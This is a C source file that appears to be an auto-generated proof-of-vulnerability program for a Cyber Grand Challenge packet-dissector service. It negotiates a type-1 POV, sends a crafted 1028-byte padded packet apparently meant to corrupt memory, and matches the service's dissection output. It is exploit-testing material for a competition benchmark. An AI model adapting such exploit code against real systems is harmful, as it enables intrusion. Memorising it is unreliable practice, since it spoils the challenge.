#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xe6\xda\xc4\x90"
         "\x75\x12\x88\xa0\x88\x5b\xa2\x19\x1e\x78\x7f\xb1\x75\x1b\xe6\x23"
         "\x15\x01\x00\x00\x86\xd8\x21\x14\x55\xe5\x8a\x66\x01\x00\x74\xbd"
         "\xb2\xaf\x8f\xca\x92\x88\x7f\x46\xda\x5a\x8e\xd6\x74\xff\xdf\xb6"
         "\x8f\x1e\x3a\x2e\x33\x1a\xb5\x9f\x83\x0b\x56\xba\xc3\x5a\x0b\x2a"
         "\xfa\xa8\x11\xc5\x5d\x4f\xf1\xde\x82\xf9\x11\x3d\xc3\xe3\x9c\xfb"
         "\xf3\xb1\x6c\x71\x9d\x97\xd6\xc7\xc2\x57\x97\x13\x6b\xe3\xa5\xe5"
         "\x26\xcc\x01\xe8\x2f\x7c\x91\x7e\xee\x61\xbd\xdd\x31\xe7\xd9\xa3"
         "\x7a\xeb\x21\x68\x40\x1a\xf6\x74\x65\xea\x1b\x54\x66\x51\xfa\x8f"
         "\xe1\x9b\x86\x58\x3d\x4d\x68\x9e\xc5\xd2\x42\x36\xc1\x6e\xf8\x78"
         "\x20\x61\x68\x8d\xbd\x45\x59\x1d\x7a\xab\xfb\x49\x9f\xbc\x96\x6e"
         "\xb1\x5e\x3a\x40\x31\x39\x3c\xbf\x69\xbc\xd8\x36\x01\xa1\x28\xa6"
         "\xb6\x4a\x97\xa3\x01\x9c\xb3\x09\x92\xa8\x08\x4b\x2f\x2b\xe0\xe1"
         "\x0f\x93\x0b\x3c\xd6\xc7\x37\xbe\x35\x13\x08\xd1\x7d\xa0\x30\xe7"
         "\x65\x2d\x65\xa4\x94\x19\x87\xa0\xd0\xf4\xf3\x2d\x9d\x82\x2e\x09"
         "\x89\x0f\x16\xc6\x47\x16\xfd\xa0\x01\x8b\xe4\x86\x98\x00\xe6\x0f"
         "\x77\x55\xc9\xd7\xb4\x3c\x73\xc7\x27\x7b\x67\x96\x01\x95\x26\x71"
         "\xbe\x9d\x70\x28\xd5\x93\x0e\x1e\x63\x5e\x6b\x62\x73\x5e\x26\x0f"
         "\xa5\x98\x9c\x18\xf2\x55\x61\x5e\xef\x16\x6b\x1a\xc4\x18\x61\x4f"
         "\xc9\x00\x86\xf6\x34\xe4\x62\x0a\x46\x91\x61\x3d\x7f\xcd\x43\x1c"
         "\xe2\x77\x30\x10\x0b\xde\xbd\x0f\xd4\x92\xcb\x10\x1c\x54\xf0\x5c"
         "\x3c\x98\x81\xa3\x37\x1b\x01\xaa\xa2\xb9\x5b\x24\x2e\x3d\x49\x5b"
         "\x3f\x33\x1e\x55\xb3\xe1\x9c\xf3\xea\xbe\x82\xd5\xe7\xb2\x08\x25"
         "\x66\x9b\xf1\xd8\x4e\x76\x34\x95\x1a\xda\x56\x01\x00\xc2\x01\x00"
         "\x65\xc9\x25\xe7\x59\x2b\x95\x54\xf5\x8f\x68\x2b\xe3\x5e\x03\x54"
         "\xf0\xc3\xfc\xaa\x6a\xd7\xa4\x6b\xb5\x14\x9c\x1b\x8d\x71\x8f\x44"
         "\x16\x6a\x9a\x85\x91\xb1\x9b\xc0\x13\xb8\xca\x8e\xad\x78\xbe\x32"
         "\xe9\x4b\xb3\x7f\xaa\xcc\x92\xe3\x3e\x7a\xa4\x2e\xef\x9a\xb8\xbc"
         "\x8f\x69\x7f\x37\x1a\xd1\x9b\x99\x4a\xc4\xc8\xc1\x9f\x84\x3c\x15"
         "\x01\xc7\x75\x08\x61\xc0\xaa\x50\x44\x15\x37\x5b\xe3\x86\x3e\xae"
         "\x12\xae\x08\xd5\x82\x1b\x99\x5c\x40\x34\x38\x22\x6d\x02\x90\xec"
         "\xe9\x88\xdf\x4d\x40\xac\xdd\x44\x4c\xdd\xce\xd8\xda\x01\xf7\xfc"
         "\x5f\x0c\x17\xf3\x7c\x23\x71\x00\xa6\x0b\x6d\xc7\x53\x2e\x9f\xb2"
         "\xe6\x7c\xbd\xd8\xa5\xbc\x72\x7a\x48\xb1\x56\x01\x5c\x37\x1a\xbd"
         "\x60\x22\x6b\x92\x41\x0b\x6e\x52\x53\x36\xb5\x22\x57\x79\xce\x7e"
         "\x17\x97\xed\x30\x66\xa1\x20\xd4\x96\xd1\x10\xb3\x14\x7e\xcc\x97"
         "\xd1\x60\x0f\x92\xba\x70\x42\x53\xaa\xaf\x4a\xdc\x04\x03\x96\xaf"
         "\x1b\x36\x9a\xdf\xf4\xe6\x3d\xa7\x74\x75\x03\xc2\x67\x93\xaa\x40"
         "\x6b\x02\x61\x08\xf6\x7b\x45\x7a\x70\x51\x32\x1a\x79\x73\xba\x88"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===cystocarppapaprelatical
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x63\x79\x73\x74\x6f\x63\x61\x72\x70\x70\x61"
         "\x70\x61\x70\x72\x65\x6c\x61\x74\x69\x63\x61\x6c";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
